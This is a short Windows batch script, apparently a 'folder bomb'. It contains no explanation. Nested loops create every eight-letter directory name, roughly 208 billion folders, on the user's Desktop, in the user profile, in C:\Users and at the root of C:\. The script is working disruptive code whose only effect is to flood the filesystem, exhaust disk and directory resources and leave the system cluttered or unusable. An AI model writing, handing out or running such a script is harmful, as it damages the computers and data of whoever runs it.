@echo off
setlocal enabledelayedexpansion
set characters=(q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m)
set directory=C:\Users\%USERNAME%\Desktop
call :dirCreator %directory%
set directory=C:\Users\%USERNAME%
call :dirCreator %directory% 
set directory=C:\Users
call :dirCreator %directory% 
set directory=C:\ 
call :dirCreator %directory%











:dirCreator
for %%a in %characters% do (
for %%b in %characters% do (
for %%c in %characters% do (
for %%d in %characters% do (
for %%e in %characters% do (
for %%f in %characters% do (
for %%g in %characters% do (
for %%h in %characters% do (
set fileName=%%a%%b%%c%%d%%e%%f%%g%%h
mkdir %1\!fileName!
)
)
)
)
)
)
)
)
exit /b




endlocal
